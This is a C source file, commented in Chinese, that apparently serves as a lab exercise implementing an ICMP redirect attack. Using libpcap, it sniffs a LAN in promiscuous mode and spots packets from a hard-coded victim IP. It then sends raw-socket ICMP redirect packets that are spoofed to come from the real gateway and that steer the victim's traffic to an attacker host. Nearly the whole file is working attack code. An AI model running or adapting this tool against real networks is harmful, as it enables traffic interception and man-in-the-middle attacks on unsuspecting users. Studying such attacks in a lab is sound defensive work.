
/**
 * ICMP重定向
 * 步骤：1.嗅探，2.重定向
 * 
 * 嗅探器
 * 1. 确定设备接口，如eth0 调用pcap_lookupdev
 * 2. 初始化嗅探器，pcap_open_live
 * 3. 过滤规则设定 pcap_compile , pcap_setfilter 
 * 4. 嗅探，pcap_next (只读一 次) , pcap_loop (循环处理)，使用回调函数，分析数据包
 * 5. 结束，pcap_close 
 * 
 * 重定向
 * 使用原始套接字 raw socket, sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)
 * 构建IP头、icmp头、icmp数据
 * 
 */
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#define MAX 1024
/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

const unsigned char *Vic_IP = "192.168.72.129";//攻击对象的ip
const unsigned char *Ori_Gw_IP = "192.168.72.2";//源网关ip
const unsigned char *Redic_IP = "192.168.72.128";//重定向ip

/* Ethernet header */
struct ethernet_header{
        u_int8_t  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_int8_t  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_int16_t ether_type;                     /* IP? ARP? RARP? etc */
};


/* IP header */
struct ip_header  
{  
#ifdef WORDS_BIGENDIAN  
  u_int8_t ip_version:4;  
  u_int8_t ip_header_length:4;  
#else  
  u_int8_t ip_header_length:4;  
  u_int8_t ip_version:4;  
#endif  
  u_int8_t ip_tos;  
  u_int16_t ip_length;  
  u_int16_t ip_id;  
  u_int16_t ip_off;  
  u_int8_t ip_ttl;  
  u_int8_t ip_protocol;  
  u_int16_t ip_checksum;  
  struct in_addr ip_source_address;  
  struct in_addr ip_destination_address;  
};  
//#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
//#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int16_t tcp_seq;

struct tcp_header{
        u_int16_t th_sport;               /* source port */
        u_int16_t th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_int8_t  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_int8_t  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_int16_t th_win;                 /* window */
        u_int16_t th_sum;                 /* checksum */
        u_int16_t th_urp;                 /* urgent pointer */
};

/*icmp 重定向报文头*/
struct icmp_header  
{  
  u_int8_t icmp_type;  
  u_int8_t icmp_code;  
  u_int16_t icmp_checksum;  
  struct in_addr icmp_gateway_addr;

  //u_int16_t icmp_identifier;  
  //u_int16_t icmp_sequence;  
};  


/*计算校验和*/  
u_int16_t checksum(u_int8_t *buf,int len)  
{  
    u_int32_t sum=0;  
    u_int16_t *cbuf;  
  
    cbuf=(u_int16_t *)buf;  
  
    while(len>1)
	{  
    	sum+=*cbuf++;  
    	len-=2;  
    }  
  
    if(len)  
        sum+=*(u_int8_t *)cbuf;  
  
        sum=(sum>>16)+(sum & 0xffff);  
        sum+=(sum>>16);  
  
        return ~sum;  
} 

/*重定向攻击*/
void icmp_redirect(int sockfd,const unsigned char * packet_data){

	struct ip_header *ip;
    struct icmp_header *icmp;
    //先设定好数据格式：ip头，ip数据=(icmp头，icmp数据)
	struct packet_struct{
        struct iphdr ip;
        struct icmphdr icmp;
        char datas[28];
    }packet;
	

	//ip头 20字节
    packet.ip.version = 4;
    packet.ip.ihl = 5;
    packet.ip.tos = 0;  //服务类型
    packet.ip.tot_len = htons(56);  //host to short
    packet.ip.id = getpid();
    packet.ip.frag_off = 0;
    packet.ip.ttl = 255;
    packet.ip.protocol = IPPROTO_ICMP;
    packet.ip.check = 0;
    packet.ip.saddr = inet_addr(Ori_Gw_IP); //要伪造网关发送ip报文
    packet.ip.daddr = inet_addr(Vic_IP);    //将伪造重定向包发给受害者
    
    

    //icmp头 8字节
    packet.icmp.type = ICMP_REDIRECT;
    packet.icmp.code = ICMP_REDIR_HOST;
    packet.icmp.checksum = 0;
    packet.icmp.un.gateway = inet_addr(Redic_IP);
    struct sockaddr_in dest =  {
        .sin_family = AF_INET,
        .sin_addr = {
            .s_addr = inet_addr(Vic_IP)
        }
    };
    //拷贝抓到的IP包中的ip头和数据部分共28个字节 ，作为icmp重定向包的icmp数据部分
	memcpy(packet.datas,(packet_data + SIZE_ETHERNET),28);
    packet.ip.check = checksum(&packet.ip,sizeof(packet.ip));
    packet.icmp.checksum = checksum(&packet.icmp,sizeof(packet.icmp)+28);
    
    //sendto用于非可靠连接的数据数据发送，如UDP， 接收数据用recvfrom
    //ssize_t sendto(int sockfd,const void *buf, size_t len, 
    //int flags, const struct sockaddr *dst_addr, socklen_t addrlen);
    //（发送端套接字描述符，待发送数据的缓冲区，待发送数据长度IP头+ICMP头（8）+IP首部+IP前8字节，
    //flag标志位，一般为0，数据发送的目的地址，地址长度）  
	sendto(sockfd,&packet,56,0,(struct sockaddr *)&dest,sizeof(dest));
    printf("redirect\n");
}
/*解析IP数据包*/
void parseIPHeader(const u_int8_t *ip_packet)
{
	const struct ip_header *ip;
	ip = (struct ip_header*)ip_packet;
	int ip_header_len = ip->ip_header_length*4;

	if(ip_header_len<20)
	{
		//printf("Invalid IP header len!\n");
		return;
	}

    //寻找攻击对象的数据包
	if(!strcmp(Vic_IP,inet_ntoa(ip->ip_source_address)))
	{
        int sockfd,res;
        int one = 1;
        int *ptr_one = &one;
        //创建原始套接字
        if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
        {
            printf("create sockfd error\n");
            exit(-1);
        }
        //发送数据时，不执行系统缓冲区到socket缓冲区的拷贝，以提高系统性能，应为
        /**
         设置sockfd套接字关联的选 项
        sockfd:指向一个打开的套接口描述字
        IPPROTO_IP：指定选项代码的类型为IPV4套接口
        IP_HDRINCL：详细代码名称（需要访问的选项名字）
        ptr_one：一个指向变量的指针类型，指向选项要设置的新值的缓冲区
        sizeof(one)：指针大小
        */
        //开启IP_HDRINCL选项，让用户自己生成IP头部的数据
        res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));
        if(res < 0)
        {
            printf("error--\n");
            exit(-3);
        }

        icmp_redirect(sockfd,ip_packet);
        close(sockfd);		
	}
}
/*解析数据包*/
void getPacket(u_int8_t * arg, const struct pcap_pkthdr * pkthdr, const u_int8_t * packet) //pcap_pkthdr:在pcap.h中定义，packet:保存捕获的数据 
{
    static int count = 1;   //计数

    /* 包头 */
	const struct ethernet_header *ethernet;  /* The ethernet header [1] */
	const struct ip_header *ip;              /* The IP header */
	const struct tcp_header *tcp;            /* The TCP header */
	const char *payload;                    /* Packet payload */

    int size_ip;
	int size_tcp;
	int size_payload;

    printf("\nPacket number %d:\n", count++);
    printf("Packet length: %d\n", pkthdr->len);

    /* define ethernet header */
	ethernet = (struct ethernet_header*)(packet);
	
	/* define/compute ip header offset */   
	ip = (struct ip_header*)(packet + SIZE_ETHERNET);    //强制类型转换
	size_ip = (ip->ip_header_length)*4;  //IP头长度的单位是4字节
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* print source and destination IP addresses */
	printf("       From: %s\n", inet_ntoa(ip->ip_source_address)); /* Convert Internet number in IN to ASCII representation.  The return value
                                                        is a pointer to an internal array containing the string.  */
	printf("         To: %s\n", inet_ntoa(ip->ip_destination_address));
	
    /* determine protocol */	
	switch(ip->ip_protocol) {
		case IPPROTO_TCP:
			printf("   Protocol: TCP\n");
			break;
		case IPPROTO_UDP:
			printf("   Protocol: UDP\n");
			break;
		case IPPROTO_ICMP:
			printf("   Protocol: ICMP\n");
			break;
		case IPPROTO_IP:
			printf("   Protocol: IP\n");
			break;
		default:
			printf("   Protocol: unknown\n");
			break;
	}

    //接受到的是以太网帧
	ethernet = (struct ethernet_header*)packet;
	ip = (struct ip_header*)(packet + SIZE_ETHERNET);
    //检测目标ip的数据，设置socket，重定向
	parseIPHeader(packet + SIZE_ETHERNET);
    
    return;
}



int main(int argc, char *argv[])
{
    char *dev=NULL; //设备名称
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle; //会话句柄
    struct bpf_program fp; //编译的过滤器表达式
    char filter_exp[] = "ip"; //过滤器监听端口
    bpf_u_int32 mask;//自己的掩码
    bpf_u_int32 net; //自己的ip
    int num_packets = 20;	//要捕获的数据包个数
    int RedirectFlag = 0;   //是否重定向攻击

    //获取网卡
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    

    //获取设备的ip和mask
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}
    printf("Device: %s\n", dev);
    
    //打开设备，1表示混杂模式（网卡接收经过的所有数据流，不论目的地址），BUFSIZ为最大补货数据量，1000位读取超时 ms
    //获取一个会话
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
		 fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		 return(2);
	}

    //过滤指定流量，htto 80，DNS 53，或直接ip,tcp
    //编译过滤器表达式,使嗅探器在设备dev上以混杂模式嗅探来自或前往端口filter_exp的所有流量
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return(2);
	 }
     //应用过滤器
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return(2);
	 }

     /*
     //抓个包
     packet = pcap_next(handle, &header);
     printf("packet length = %d\n", header.len);
     
    */
    //循环抓包
    pcap_loop(handle, -1, getPacket, NULL);   //num_packets为抓包个数，-1为一直抓包，getBack回调函数，NULL默认，未知 

    pcap_freecode(&fp);
    pcap_close(handle);

    printf("\nCapture complete.\n");
    return(0);
}